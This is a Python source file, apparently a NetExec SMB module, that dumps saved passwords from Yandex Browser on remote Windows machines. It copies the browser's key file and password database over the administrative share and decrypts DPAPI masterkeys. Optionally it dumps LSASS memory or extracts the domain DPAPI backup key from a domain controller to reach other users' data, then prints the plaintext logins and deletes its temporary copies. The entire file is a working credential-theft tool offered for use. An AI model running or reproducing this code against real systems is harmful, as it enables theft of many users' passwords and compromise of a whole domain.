# Yandex Browser DPAPI credential extractor (Yandex Browser uses Chromium DPAPI encryption with custom Ya Passman layer).
#
# Author:
#   @pavelpashka1
#
# References:
#   https://yandex.ru/support/browser/security/passwords.html
#   https://github.com/akhomlyuk/Ya_Decrypt
#
import base64
import hashlib
import json
import os
import re
import sqlite3
import time
from binascii import hexlify, unhexlify

from Crypto.Cipher import AES

from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.lib.masterkey import Masterkey as DplootMasterkey
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.backupkey import BackupkeyTriage
from dploot.triage.masterkeys import MasterkeysTriage

from nxc.helpers.misc import CATEGORY
from nxc.protocols.smb.dpapi import upgrade_to_dploot_connection

try:
    from lsassy.dumper import Dumper
    from lsassy.impacketfile import ImpacketFile
    from lsassy.parser import Parser
    from lsassy.session import Session

    HAS_LSASSY = True
except ImportError:
    HAS_LSASSY = False

LOCAL_STATE_PATH = r"Users\{user}\AppData\Local\Yandex\YandexBrowser\User Data\Local State"
PASSMAN_PATH = r"Users\{user}\AppData\Local\Yandex\YandexBrowser\User Data\{profile}\Ya Passman Data"
YANDEX_CHECK = r"Users\{user}\AppData\Local\Yandex\YandexBrowser"

YANDEX_SIG = b"\x08\x01\x12\x20"
class NXCModule:
    """
    Yandex Browser DPAPI credential extractor.

    Module by @pavelpashka1

    Extracts saved passwords from Yandex Browser by decrypting its
    DPAPI-protected encryption keys and the password database (Ya Passman Data).

    Supports three modes:
      - Default: decrypts the authenticated user's passwords
      - LSASS: dumps lsass to get credentials for users with active sessions
      - BACKUPKEY: uses the DPAPI Domain Backup Key (requires Domain Admin)
    """

    name = "yandex"
    description = "Dump credentials from Yandex Browser via DPAPI"
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING
    opsec_safe = False
    multiple_targets = False

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.lsass_mode = False
        self.backupkey_mode = False
        self.lsass_method = "comsvcs"
        self.dc_ip = None
        self.pvkfile = None
        self.target_users = None
        self.verbose = False

    def options(self, context, module_options):
        """
        LSASS           Enable LSASS credential dump via lsassy (true/false)
        LSASS_METHOD    Dump method: comsvcs, nanodump, procdump, etc. (default: comsvcs)
        BACKUPKEY       Enable DPAPI Domain Backup Key attack (true/false)
        DC              Domain Controller IP (required for BACKUPKEY unless PVKFILE is set)
        PVKFILE         Path to a previously saved .pvk backup key file
        USERS           Comma-separated list of target usernames (default: all found)
        VERBOSE         Show detailed LSASS credential table (true/false)
        """
        if "LSASS" in module_options:
            self.lsass_mode = module_options["LSASS"].lower() == "true"
        if "LSASS_METHOD" in module_options:
            self.lsass_method = module_options["LSASS_METHOD"]
        if "BACKUPKEY" in module_options:
            self.backupkey_mode = module_options["BACKUPKEY"].lower() == "true"
        if "DC" in module_options:
            self.dc_ip = module_options["DC"]
        if "PVKFILE" in module_options:
            self.pvkfile = module_options["PVKFILE"]
        if "USERS" in module_options:
            self.target_users = [u.strip().lower() for u in module_options["USERS"].split(",") if u.strip()]
        if "VERBOSE" in module_options:
            self.verbose = module_options["VERBOSE"].lower() == "true"
    def _make_target(self, connection, address_override=None):
        """Build a dploot Target from an NXC connection object."""
        return Target.create(
            domain=connection.domain,
            username=connection.username,
            password=getattr(connection, "password", ""),
            target=address_override or connection.host,
            lmhash=getattr(connection, "lmhash", ""),
            nthash=getattr(connection, "nthash", ""),
            do_kerberos=getattr(connection, "kerberos", False),
            aesKey=getattr(connection, "aesKey", None),
            no_pass=True,
            use_kcache=getattr(connection, "use_kcache", False),
        )

    @staticmethod
    def _make_dploot_conn(connection, target):
        """Wrap existing NXC SMB session into a DPLootSMBConnection."""
        conn = upgrade_to_dploot_connection(connection=connection.conn, target=target)
        if conn is None:
            raise RuntimeError("Could not upgrade SMB connection to dploot")
        return conn
    def on_admin_login(self, context, connection):
        smb = connection.conn
        auth_user = connection.username.split("\\")[-1].lower()
        password = getattr(connection, "password", None)
        cleanup_files = []

        nthash_hex = getattr(connection, "nthash", "") or ""
        domain = getattr(connection, "domain", "") or ""

        is_local_auth = getattr(connection, "local_auth", False)
        if not is_local_auth:
            args = getattr(connection, "args", None)
            if args:
                is_local_auth = getattr(args, "local_auth", False)
        is_domain_user = bool(domain) and not is_local_auth

        context.log.display("Extracting Yandex Browser credentials")

        target = self._make_target(connection)
        try:
            dploot_conn = self._make_dploot_conn(connection, target)
        except Exception as e:
            context.log.fail(f"dploot connection failed: {e}")
            return

        self._process_auth_user(
            smb, dploot_conn, target, auth_user, password,
            nthash_hex, is_domain_user, context, connection, cleanup_files,
        )

        if not (self.lsass_mode or self.backupkey_mode):
            self._cleanup(cleanup_files)
            return

        other_users = self._enumerate_yandex_users(smb, auth_user, context)
        if not other_users:
            context.log.display("No other users with Yandex Browser found")
            self._cleanup(cleanup_files)
            return

        context.log.display(f"Found Yandex Browser for users: {', '.join(other_users)}")

        if self.lsass_mode:
            self._lsass_attack(other_users, dploot_conn, target, context, connection, cleanup_files)

        if self.backupkey_mode:
            self._backupkey_attack(smb, other_users, dploot_conn, target, context, connection, cleanup_files)

        self._cleanup(cleanup_files)
        context.log.success("Yandex Browser dump completed")
    def _enumerate_yandex_users(self, smb, skip_user, context):
        """List usernames that have Yandex Browser data, excluding skip_user."""
        users = []
        try:
            for entry in smb.listPath("C$", "Users\\*"):
                name = entry.get_longname()
                if name in (".", "..", "Public", "Default", "Default User", "All Users"):
                    continue
                if not entry.is_directory():
                    continue
                uname = name.lower()
                if uname == skip_user:
                    continue
                if self.target_users and uname not in self.target_users:
                    continue
                try:
                    smb.listPath("C$", YANDEX_CHECK.format(user=name) + "\\*")
                    users.append(name)
                except Exception:
                    continue
        except Exception as e:
            context.log.debug(f"User enumeration error: {e}")
        return users
    @staticmethod
    def _triage_masterkeys_for_user(dploot_conn, target, user, passwords=None, nthashes=None, pvkbytes=None, context=None):
        """Use dploot MasterkeysTriage to collect and decrypt masterkeys for a single user."""
        try:
            mk_triage = MasterkeysTriage(
                target=target,
                conn=dploot_conn,
                pvkbytes=pvkbytes,
                passwords=passwords or {},
                nthashes=nthashes or {},
            )
            masterkeys = mk_triage.triage_masterkeys_for_user(user)
            if context:
                context.log.debug(f"[{user}] dploot decrypted {len(masterkeys)} masterkey(s)")
            return masterkeys
        except Exception as e:
            if context:
                context.log.debug(f"[{user}] dploot masterkey triage error: {e}")
            return []
    @staticmethod
    def _unprotect_encrypted_key(blob, masterkeys):
        """Decrypt DPAPI blob using dploot find_masterkey_for_blob + decrypt_blob."""
        try:
            mk = find_masterkey_for_blob(blob, masterkeys)
            if mk is None:
                return None
            return decrypt_blob(blob, mk)
        except Exception:
            return None
    def _process_auth_user(self, smb, dploot_conn, target, user, password, nthash_hex, is_domain_user, context, connection, cleanup_files):
        """Decrypt the authenticated user's browser data."""
        ls_local = f"Local_State_{user}.json"
        remote = LOCAL_STATE_PATH.format(user=user)
        try:
            with open(ls_local, "wb") as f:
                smb.getFile("C$", remote, f.write)
            cleanup_files.append(ls_local)
        except Exception as e:
            context.log.fail(f"[{user}] Local State inaccessible: {e}")
            return

        encrypted_blob = self._extract_encrypted_key(ls_local)
        if not encrypted_blob:
            context.log.fail(f"[{user}] encrypted_key not found")
            return

        passman_db = self._download_passman_db(smb, user, context, connection)
        if not passman_db:
            context.log.fail(f"[{user}] Ya Passman Data not found")
            return
        cleanup_files.append(passman_db)

        passwords = {}
        nthashes = {}
        if password:
            passwords[user.lower()] = password
        if nthash_hex and is_domain_user:
            nthashes[user.lower()] = nthash_hex

        masterkeys = self._triage_masterkeys_for_user(
            dploot_conn, target, user,
            passwords=passwords, nthashes=nthashes,
            context=context,
        )

        if not masterkeys:
            if not password and nthash_hex and not is_domain_user:
                context.log.fail(
                    f"[{user}] No masterkeys decrypted. Local account with NT-hash only: "
                    "DPAPI requires SHA1(password). Use plaintext password or LSASS=true"
                )
            else:
                context.log.fail(f"[{user}] No masterkeys decrypted")
            return

        self._do_browser_decrypt(encrypted_blob, masterkeys, passman_db, user, context, connection)

    def _do_browser_decrypt(self, encrypted_blob, masterkeys, passman_db, user, context, connection):
        """Decrypt browser AES key, then password_key, then passwords."""
        aes_key = self._unprotect_encrypted_key(encrypted_blob, masterkeys)
        if not aes_key:
            context.log.fail(f"[{user}] Failed to decrypt encrypted_key")
            return
        context.log.success(f"[{user}] AES key recovered: {hexlify(aes_key).decode()}")

        password_key = self._get_local_encryptor_key(passman_db, aes_key)
        if not password_key:
            context.log.fail(f"[{user}] Failed to decrypt local_encryptor_key")
            return

        self._decrypt_passwords(passman_db, password_key, context, connection.host, user)

    def _process_other_user_with_masterkeys(self, smb, user, masterkeys, context, connection, cleanup_files):
        """Download browser data for user and decrypt with already-decrypted masterkeys."""
        ls_local = f"Local_State_{user}.json"
        remote = LOCAL_STATE_PATH.format(user=user)
        try:
            with open(ls_local, "wb") as f:
                smb.getFile("C$", remote, f.write)
            cleanup_files.append(ls_local)
        except Exception:
            context.log.debug(f"[{user}] Local State inaccessible")
            return

        encrypted_blob = self._extract_encrypted_key(ls_local)
        if not encrypted_blob:
            context.log.debug(f"[{user}] encrypted_key not found")
            return

        passman_db = self._download_passman_db(smb, user, context, connection)
        if not passman_db:
            context.log.debug(f"[{user}] Ya Passman Data not found")
            return
        cleanup_files.append(passman_db)

        self._do_browser_decrypt(encrypted_blob, masterkeys, passman_db, user, context, connection)
    def _lsass_attack(self, users, dploot_conn, target, context, connection, cleanup_files):
        """Dump LSASS via lsassy, then use extracted creds to decrypt masterkeys via dploot."""
        if not HAS_LSASSY:
            context.log.fail("[LSASS] lsassy is not installed (pip install lsassy)")
            return

        context.log.display(f"[LSASS] Dumping LSASS (method={self.lsass_method})")

        host = connection.host
        domain_name = connection.domain
        username = connection.username
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")

        session = Session()
        session.get_session(
            address=host,
            target_ip=host,
            port=445,
            lmhash=lmhash,
            nthash=nthash,
            username=username,
            password=password,
            domain=domain_name,
        )
        if session.smb_session is None:
            context.log.fail("[LSASS] Could not connect")
            return

        dumper = Dumper(session, timeout=10, time_between_commands=7).load(self.lsass_method)
        if dumper is None:
            context.log.fail(f"[LSASS] Unable to load method '{self.lsass_method}'")
            return

        dump_file = dumper.dump()
        if dump_file is None:
            context.log.fail("[LSASS] Unable to dump lsass")
            return

        parsed = Parser(host, dump_file).parse()
        if parsed is None:
            context.log.fail("[LSASS] Unable to parse lsass dump")
            return

        credentials, tickets, masterkeys_from_lsass = parsed
        dump_file.close()

        try:
            file_path = dump_file.get_file_path()
            ImpacketFile.delete(session, file_path)
        except Exception:
            pass

        if not credentials:
            context.log.display("[LSASS] No credentials found")
            return

        cred_map = {}
        for cred in credentials:
            c = cred.get_object()
            if c.get("ticket") or c.get("masterkey"):
                continue
            u = (c.get("username") or "").lower()
            if not u or u.endswith("$"):
                continue
            entry = cred_map.setdefault(u, {})
            if c.get("password") and not entry.get("password"):
                entry["password"] = c["password"]
            if c.get("nthash") and not entry.get("nthash"):
                entry["nthash"] = c["nthash"]
            if c.get("sha1") and not entry.get("sha1"):
                entry["sha1"] = c["sha1"]

        lsass_dpapi_keys = {}
        if masterkeys_from_lsass:
            for mk_cred in masterkeys_from_lsass:
                try:
                    obj = mk_cred if isinstance(mk_cred, dict) else mk_cred.get_object()
                    guid = (obj.get("guid") or obj.get("masterkey") or "").lower().strip("{}")
                    key_hex = obj.get("key") or obj.get("sha1") or ""
                    if guid and key_hex:
                        lsass_dpapi_keys[guid] = unhexlify(key_hex)
                except Exception:
                    pass
        if lsass_dpapi_keys:
            context.log.success(f"[LSASS] Got {len(lsass_dpapi_keys)} pre-decrypted DPAPI masterkey(s) from cache")

        context.log.success(f"[LSASS] Got credentials for {len(cred_map)} user(s)")

        if self.verbose:
            self._print_lsass_verbose(cred_map, lsass_dpapi_keys, context)

        smb = connection.conn

        for user in users:
            ulow = user.lower()
            if ulow not in cred_map:
                context.log.debug(f"[LSASS] No creds for {user}")
                continue

            context.log.display(f"[LSASS] Processing {user}")
            entry = cred_map[ulow]

            passwords = {}
            nthashes = {}
            if entry.get("password"):
                passwords[ulow] = entry["password"]
            if entry.get("nthash"):
                nthashes[ulow] = entry["nthash"]

            dec_masterkeys = self._triage_masterkeys_for_user(
                dploot_conn, target, user,
                passwords=passwords, nthashes=nthashes,
                context=context,
            )

            if not dec_masterkeys and entry.get("sha1"):
                context.log.debug(f"[LSASS][{user}] Retrying with SHA1 prekey")
                dec_masterkeys = self._triage_masterkeys_for_user(
                    dploot_conn, target, user,
                    nthashes={ulow: entry["sha1"]},
                    context=context,
                )

            if not dec_masterkeys and lsass_dpapi_keys:
                context.log.debug(f"[LSASS][{user}] Using {len(lsass_dpapi_keys)} raw key(s) from LSASS DPAPI cache")
                dec_masterkeys = [
                    DplootMasterkey(guid=guid, key=key_bytes)
                    for guid, key_bytes in lsass_dpapi_keys.items()
                ]

            if not dec_masterkeys:
                context.log.fail(f"[LSASS][{user}] No masterkeys decrypted")
                continue

            context.log.success(f"[LSASS][{user}] Got {len(dec_masterkeys)} masterkey(s)")
            self._process_other_user_with_masterkeys(smb, user, dec_masterkeys, context, connection, cleanup_files)

    def _print_lsass_verbose(self, cred_map, lsass_dpapi_keys, context):
        """Print detailed LSASS credential table when VERBOSE=true."""
        context.log.display("[LSASS] Extracted credentials:")
        for u_name, u_data in cred_map.items():
            has_pwd = "Y" if u_data.get("password") else "N"
            has_nt = "Y" if u_data.get("nthash") else "N"
            has_sha1 = "Y" if u_data.get("sha1") else "N"
            context.log.display(f"[LSASS]   {u_name} | password={has_pwd} nthash={has_nt} sha1={has_sha1}")
            if u_data.get("nthash"):
                context.log.display(f"[LSASS]     NT-hash: {u_data['nthash']}")
            if u_data.get("sha1"):
                context.log.display(f"[LSASS]     SHA1: {u_data['sha1']}")
            if u_data.get("password"):
                context.log.display(f"[LSASS]     Password: {u_data['password']}")
        if lsass_dpapi_keys:
            context.log.display(f"[LSASS]   DPAPI cache: {len(lsass_dpapi_keys)} masterkey(s)")
    def _backupkey_attack(self, smb, users, dploot_conn, target, context, connection, cleanup_files):
        """Use DPAPI Domain Backup Key to decrypt any domain user's masterkeys."""
        pvkbytes = None

        if self.pvkfile:
            try:
                with open(self.pvkfile, "rb") as f:
                    pvkbytes = f.read()
                context.log.success(f"[BACKUPKEY] Loaded PVK from {self.pvkfile}")
            except Exception as e:
                context.log.fail(f"[BACKUPKEY] Cannot read PVK file: {e}")
                return
        elif self.dc_ip:
            pvkbytes = self._extract_backup_key_from_dc(context, connection)
            if not pvkbytes:
                return
        else:
            context.log.fail("[BACKUPKEY] Specify DC=<ip> or PVKFILE=<path>")
            return

        for user in users:
            context.log.display(f"[BACKUPKEY] Processing {user}")
            masterkeys = self._triage_masterkeys_for_user(
                dploot_conn, target, user,
                pvkbytes=pvkbytes,
                context=context,
            )
            if not masterkeys:
                context.log.fail(f"[BACKUPKEY][{user}] No masterkeys decrypted")
                continue
            context.log.success(f"[BACKUPKEY][{user}] Decrypted {len(masterkeys)} masterkey(s)")
            self._process_other_user_with_masterkeys(smb, user, masterkeys, context, connection, cleanup_files)

    def _extract_backup_key_from_dc(self, context, connection):
        """Extract DPAPI Domain Backup Key from DC via dploot BackupkeyTriage."""
        context.log.display(f"[BACKUPKEY] Extracting backup key from DC {self.dc_ip}")
        try:
            dc_target = Target.create(
                domain=connection.domain,
                username=connection.username,
                password=getattr(connection, "password", ""),
                target=self.dc_ip,
                lmhash=getattr(connection, "lmhash", ""),
                nthash=getattr(connection, "nthash", ""),
                do_kerberos=getattr(connection, "kerberos", False),
                aesKey=getattr(connection, "aesKey", None),
                no_pass=True,
            )
            dc_conn = DPLootSMBConnection(dc_target)
            dc_conn.connect()

            backupkey_triage = BackupkeyTriage(target=dc_target, conn=dc_conn)
            backupkey = backupkey_triage.triage_backupkey()
            pvkbytes = backupkey.backupkey_v2

            context.log.success("[BACKUPKEY] Domain backup key extracted")
            return pvkbytes
        except Exception as e:
            context.log.fail(f"[BACKUPKEY] Failed to extract backup key: {e}")
        return None
    @staticmethod
    def _aes_gcm_decrypt(data, key, aad=None):
        """Decrypt AES-256-GCM with optional AAD."""
        try:
            iv, ct, tag = data[:12], data[12:-16], data[-16:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
            if aad:
                cipher.update(aad)
            return cipher.decrypt_and_verify(ct, tag)
        except Exception:
            return None

    @staticmethod
    def _extract_encrypted_key(path):
        """Read encrypted_key from Yandex Local State JSON."""
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            b64 = data.get("os_crypt", {}).get("encrypted_key")
            if not b64:
                return None
            raw = base64.b64decode(b64)
            return raw[5:] if raw.startswith(b"DPAPI") else raw
        except Exception:
            return None

    def _get_local_encryptor_key(self, db_path, master_key):
        """Extract and decrypt local_encryptor_key from Ya Passman Data."""
        try:
            conn = sqlite3.connect(db_path)
            cur = conn.cursor()
            cur.execute("SELECT value FROM meta WHERE key='local_encryptor_data'")
            row = cur.fetchone()
            conn.close()
            if not row:
                return None
            blob = row[0]
            idx = blob.find(b"v10")
            if idx == -1:
                return None
            enc = blob[idx + 3:idx + 99]
            dec = self._aes_gcm_decrypt(enc, master_key)
            if not dec or not dec.startswith(YANDEX_SIG):
                return None
            return dec[len(YANDEX_SIG):len(YANDEX_SIG) + 32]
        except Exception:
            return None

    def _decrypt_passwords(self, db_path, password_key, context, host, user=""):
        """Decrypt all stored passwords from Ya Passman Data."""
        try:
            conn = sqlite3.connect(db_path)
            cur = conn.cursor()
            cur.execute(
                "SELECT origin_url, username_value, password_value, "
                "username_element, password_element, signon_realm FROM logins"
            )
            for url, uname, pwd, ue, pe, realm in cur.fetchall():
                if not pwd:
                    continue
                url = url or ""
                uname = uname or ""
                ue = ue or ""
                pe = pe or ""
                realm = realm or ""
                aad = hashlib.sha1(
                    (url + "\x00" + ue + "\x00" + uname + "\x00" + pe + "\x00" + realm).encode()
                ).digest()
                plain = self._aes_gcm_decrypt(pwd, password_key, aad)
                if not plain:
                    continue
                plain = plain.decode(errors="replace")
                short = self._shorten_url(url)
                prefix = f"[{user}] " if user else ""
                context.log.highlight(f"{prefix}{short} {uname}:{plain}")
                context.db.add_dpapi_secrets(host, "YANDEX", user or context.username[0], uname, plain, short)
            conn.close()
        except Exception as e:
            context.log.fail(f"Decrypt error: {e}")

    def _download_passman_db(self, smb, user, context, connection):
        """Copy Ya Passman Data from target via remote copy + SMB download."""
        base = f"Users\\{user}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data"
        temp_remote = r"Windows\Temp\YaPassmanTemp.db"

        try:
            entries = smb.listPath("C$", base + "\\*")
        except Exception:
            return None

        for entry in entries:
            profile = entry.get_longname()
            if profile not in ("Default",) and not profile.startswith("Profile "):
                continue
            if not entry.is_directory():
                continue

            src_path = PASSMAN_PATH.format(user=user, profile=profile)

            connection.execute(f'del /F /Q "{temp_remote}" 2>nul')
            time.sleep(0.4)

            copy_cmd = f'copy /Y "{src_path}" "{temp_remote}"'
            copied = False
            for _ in range(5):
                try:
                    out = connection.execute(copy_cmd).strip()
                    if "copied" in out.lower() or not out:
                        context.log.info(f"Copied {profile} for {user}")
                        copied = True
                        break
                except Exception:
                    pass
                time.sleep(1.0)

            if not copied:
                continue

            time.sleep(0.5)

            local_filename = f"Ya_Passman_{user}_{profile}.db"
            try:
                with open(local_filename, "wb") as f:
                    smb.getFile("C$", temp_remote, f.write)
                context.log.info(f"Downloaded {profile} for {user}")

                time.sleep(0.4)
                connection.execute(f'del /F /Q "{temp_remote}" 2>nul')
                return local_filename
            except Exception as e:
                context.log.debug(f"Download failed: {e}")
                connection.execute(f'del /F /Q "{temp_remote}" 2>nul')
                continue

        return None

    @staticmethod
    def _shorten_url(url):
        """Truncate URL to scheme + host for cleaner output."""
        if not url:
            return ""
        parts = url.split("/")
        if len(parts) >= 3:
            return "/".join(parts[:3]) + "/"
        return url

    @staticmethod
    def _cleanup(files):
        """Remove temporary local files."""
        for f in files:
            try:
                if os.path.exists(f):
                    os.remove(f)
            except Exception:
                pass
